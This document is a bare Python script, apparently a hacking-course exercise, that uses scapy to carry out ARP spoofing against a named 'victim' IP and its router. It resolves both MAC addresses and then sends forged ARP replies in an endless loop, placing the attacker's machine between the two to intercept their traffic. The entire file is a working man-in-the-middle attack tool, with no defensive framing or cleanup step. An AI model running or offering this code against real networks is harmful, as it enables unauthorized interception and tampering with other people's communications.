#!/usr/bin/env python

import scapy.all as scapy
import time
import optparse

parser = optparse.OptionParser()

def get_arguments():

    parser.add_option("-t", "--target-ip", dest = "target_ip", help = "IP Address of the victim")
    parser.add_option("-r", "--router-ip", dest = "router_ip", help = "IP Address of the router")
    (options, arguments) = parser.parse_args()
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_broadcast_request = broadcast/arp_request
    answered_list = scapy.srp(arp_broadcast_request, timeout = 1, verbose = False)[0]
    mac = answered_list[0][1].hwsrc
    return mac

def spoof(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=source_ip)
    scapy.send(packet, verbose = False)

packet_count = 0
options = get_arguments()

if (not options.target_ip):
    parser.error("[-] Target IP not specified. Type --help for more info")
elif (not options.router_ip):
    parser.error("[-] Router IP not specified. Type --help for more info")
else:
    while True:
        spoof(options.target_ip, options.router_ip)
        spoof(options.router_ip, options.target_ip)
        packet_count = packet_count + 2
        print(("\r[+] "+str(packet_count)+ " packets sent."), end="")
        time.sleep(2)